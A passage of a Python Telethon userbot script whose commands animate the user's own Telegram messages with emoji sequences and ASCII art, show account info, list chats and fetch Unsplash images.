❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️🤍🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""","""❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️🤍🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️🤍❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️🤍🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️🤍🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️🤍🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤍🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️🤍🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️🤍🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️🤍🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️🤍🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️🤍🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️🤍🤍🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️🤍🤍""","""❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️🤍""", """❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️""", """❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️❤️""", """❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️❤️""", """❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️""", """❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️
❤️❤️❤️❤️❤️""", """❤️❤️❤️❤️
❤️❤️❤️❤️
❤️❤️❤️❤️
❤️❤️❤️❤️""", """❤️❤️❤️
❤️❤️❤️
❤️❤️❤️""", """❤️❤️❤️
❤️❤️❤️
❤️❤️❤️""", """❤️❤️
❤️❤️""", """❤️❤️
❤️❤️""", """❤️""", """I """, """I ❤️""","""I ❤️ U!"""]
	time.sleep(0.1)
	for d in magic:
		time.sleep(0.2)
		await event.edit(d)
@client.on(events.NewMessage(pattern=".revnum"))
async def darknetUzb(event):
	revnum = ["🔟", "9️⃣", "8️⃣", "7️⃣", "6️⃣", "5️⃣", "4️⃣", "3️⃣", "2️⃣", "1️⃣", "0️⃣", "🆘"]
	time.sleep(0.1)
	for d in revnum:
	       time.sleep(1.2)
	       await event.edit(d)
        
@client.on(events.NewMessage(pattern=".what"))
async def darknet(event):
	what = ["🤔🧐🤨🤔🧐🤨", "🧐🤨🤔🧐🤨🤔"]
	for i in range(30):
		time.sleep(0.1)
		for a in what:
			time.sleep(0.7)
			await event.edit(a)
@client.on(events.NewMessage(pattern=".smile"))
async def darknet(event):
	smile = ["😀", "😊", "😆", "😉", "😙", "🤫", "😁"]
	for i in range(30):
		time.sleep(0.1)
		for a in smile:
			time.sleep(0.7)
			await event.edit(a)
@client.on(events.NewMessage(pattern=".hi"))
async def darknet(event):
	hi = ["""╔┓┏╦━╦┓╔┓╔━━╗
║┗┛║┗╣┃║┃║X X║
║┏┓║┏╣┗╣┗╣╰╯║
╚┛┗╩━╩━╩━╩━━╝"""]
	time.sleep(0.1)
	for a in hi:
			time.sleep(0.7)
			await event.edit(a)
@client.on(events.NewMessage(pattern=".hearts"))
async def darknet(event):
	hearts = ["🤍", "🖤", "🤎", "💛", "🧡", "💙", "❤️"]
	for i in range(30):
		time.sleep(0.1)
		for a in hearts:
			time.sleep(0.7)
			await event.edit(a)
@client.on(events.NewMessage(pattern=".clock"))
async def darknet(event):
	clock = ["🕐🕐🕐", "🕑🕑🕑", "🕒🕒🕒", "🕓🕓🕓", "🕔🕔🕔", "🕧🕧🕧", "🕖🕖🕖", "🕗🕗🕗", "🕘🕘🕘", "🕙🕙🕙", "🕛🕛🕛"]
	time.sleep(0.1)
	for b in clock:
			time.sleep(0.7)
			await event.edit(b)
@client.on(events.NewMessage(pattern=".fuck"))
async def darknet(event):
	fuck = ["👋", "🤞", "🤏", "👎", "🤙", "🖕"]
	for i in range(6):
		time.sleep(0.1)
		for b in fuck:
			time.sleep(0.7)
			await event.edit(b)
@client.on(events.NewMessage(pattern=".ok"))
async def darknetUzb(event):
	ok = ["""┏━┓ ┳┏━ 
┃┈┃ ┣┻┓ 
┗━┛ ┻┈┻ 
"""]
	for d in ok:
		await event.edit(d)
@client.on(events.NewMessage(pattern=".no"))
async def darknetUzb(event):
	no = ["""─█▄──█─█▀▀▀█
─█─█─█─█───█
─█──▀█─█▄▄▄█
"""]
	for d in no:
		await event.edit(d)
	

@client.on(events.NewMessage(pattern=".d"))
async def darknetuzb(event):
	d = ["🏃", "🚶", "🧎", "🦹‍♂️", "🕴️", "🧘‍♂️"]
	time.sleep(0.7)
	for i in range(3):
		time.sleep(0.7)
		for b in d:
			time.sleep(0.7)
			await event.edit(b)
#end new
@client.on(events.NewMessage(pattern=".pisto"))
async def dark(event):
    pisto = ["""░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄
░███████████████████████ 
░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤ 
░▀░▐▓▓▓▓▓▓▌▀█░░░█▀░
░░░▓▓▓▓▓▓█▄▄▄▄▄█▀░░
░░█▓▓▓▓▓▌░░░░░░░░░░
░▐█▓▓▓▓▓░░░░░░░░░░░
░▐██████▌░░░░░░░░░░"""]
    for d in pisto:
    	await event.edit(d)
@client.on(events.NewMessage(pattern=".brain"))
async def dark(event):
    brain = ["YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠         <(^_^ <)🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠       <(^_^ <)  🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠     <(^_^ <)    🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠   <(^_^ <)      🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠 <(^_^ <)        🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠<(^_^ <)         🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n(> ^_^)>🧠         🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n  (> ^_^)>🧠       🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n    (> ^_^)>🧠     🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n      (> ^_^)>🧠   🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n        (> ^_^)>🧠 🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n          (> ^_^)>🧠🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           (> ^_^)>🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           <(^_^ <)🗑",
         "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n   miyyangiz qovoq ekan)"]
    time.sleep(0.7)
    for i in range(3):
    	time.sleep(0.7)
    for a in brain:
    	time.sleep(0.7)
    	await event.edit(a)
    
    	
sorry = ["I'm Sorry （｡≧ _ ≦｡）","≦(._.)≧ : Sorry","o(´д｀o) : I'm Sorry Pleaze Forgive me","Sorry ヾ(_ _*)","(๑•́ㅿ•̀๑ ) ᔆᵒʳʳᵞ","Sorry:(づ-̩̩̩-̩̩̩_-̩̩̩-̩̩̩)づ","༒ᎦᎧᏒᏒⲨ☆ʝααи༒"]
@client.on(events.NewMessage(pattern=".sorry"))
async def sorryy(ult):
  s = random.choice(sorry)
  return await ult.edit(f"{s}")
  
thanks = ["⋆*⁎ ᎢℋᎪɳᏦ ᎩӫᏌ ⁎*⋆","ପ(๑•̀ᴗ•̀)* ॣ৳৸ᵃᵑᵏ Ꮍ৹੫ᵎ *","ᐝ୨୧ Ƭʜᵃℕҡ ყօϋ ୨୧ᐝ","ෆ⃛ෆ⃛ෆ⃛ ♡♡[τ̲̅н̲̅a̲̅и̲̅κ̲̅ ч̲̅o̲̅u̲̅]ᴗ͈ₒᴗ͈♡","ᵗᑋᵃᐢᵏ ᵞᵒᵘ ♡⃝⃜","τнänκ чöü♥","⠒̫⃝♡ᵗʱᵃᵑᵏઽ","Thanks : ✚⃞ ⸌̷̻( ᷇ॢ〰ॢ ᷆◍)⸌̷̻"]
@client.on(events.NewMessage(pattern=".thanks"))
async def sorryy(ult):
  s = random.choice(thanks)
  return await ult.edit(f"{s}")

@client.on(events.NewMessage(pattern=r"^\.info"))
async def reg(event):
        me = await client.get_me()
        await event.edit(f"User Informatsiyasi\nID: {str(me.id)}\nIsm: {str(me.first_name)}\nFamiliya: {str(me.last_name)}\nUsername: {str(me.username)}\nUzBot - userbot")
        print(event)
@client.on(events.NewMessage(pattern=r"\.chats"))
async def infoconv(event):
            async for dailog in client.iter_dialogs():
            	await event.reply(dailog.name + " has id " + str(dailog.id))
            	time.sleep(5)
            	
                 
@client.on(events.NewMessage(pattern=r"\.pic .",outgoing=True))

async def sendpic(event):
        command = event.raw_text.split(".pic")
        keyword = command[1]
        url = f"https://source.unsplash.com/1600x900/?hacker{keyword},{keyword}"
        r = requests.get(url)

        with open("temp.jpg","wb") as file:
            file.write(r.content)
        print("downloaded")

        to_id = event.to_id

        await client.send_file(to_id,"temp.jpg")
        

@client.on(events.NewMessage)
async def my_event_handler(event):
    if ".type" == event.raw_text[:5]:
        orig_text = event.raw_text.split(".type ", maxsplit=1)[1]
        text = orig_text
        pb = "" 
        typing_symbol = "|"

        while(pb != orig_text):
            try:
                await event.edit(pb + typing_symbol)
                time.sleep(0.05)
 
                pb += text[0]
                text = text[1:]
 
                await event.edit(pb)
                time.sleep(0.05)
 
            except Exception  as e:
                print(e)

    			
 			
    			
    			
    			
client.start()
client.run_until_disconnected()